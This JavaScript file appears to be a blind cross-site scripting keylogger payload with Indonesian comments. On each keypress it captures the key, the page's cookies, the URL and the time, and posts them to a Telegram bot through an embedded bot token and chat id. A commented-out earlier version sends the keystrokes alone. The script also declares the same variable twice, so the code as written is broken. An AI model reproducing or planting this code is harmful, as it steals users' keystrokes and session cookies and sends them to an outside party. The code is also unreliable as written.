// document.addEventListener("keydown", function(event) {
//     fetch("https://api.telegram.org/bot6592357228:AAGNYLCsNW2prmow3QvY9ieeHG-stoTJ55I/sendMessage", {
//         method: "POST",
//         headers: {
//             "Content-Type": "application/json"
//         },
//         body: JSON.stringify({
//             chat_id: "-1002002449257",
//             text: "Key Pressed: " + event.key
//         })
//     });
// });
document.addEventListener("keydown", function(event) {
    try {
        const cookies = document.cookie || "No accessible cookies";
        const key = event.key;
        const location = window.location.href;
        const time = new Date().toLocaleString();
    let cookies = document.cookie; // Mengambil cookie yang bisa diakses oleh JavaScript

        fetch("https://api.telegram.org/bot6592357228:AAGNYLCsNW2prmow3QvY9ieeHG-stoTJ55I/sendMessage", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: "-1002002449257",
                text: `🛡️ Blind XSS Keylogger\n\n🕒 Waktu: ${time}\n🔑 Tombol: ${key}\n🍪 Cookies: ${cookies}\n🌐 URL: ${location}`
            })
        });
    } catch (err) {
        // Silent fail to avoid error thrown on restricted environments
    }
    fetch("https://api.telegram.org/bot6592357228:AAGNYLCsNW2prmow3QvY9ieeHG-stoTJ55I/sendMessage", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: "-1002002449257",
            text: `Key Pressed: ${event.key}\nCookies: ${cookies}`
        })
    });
});
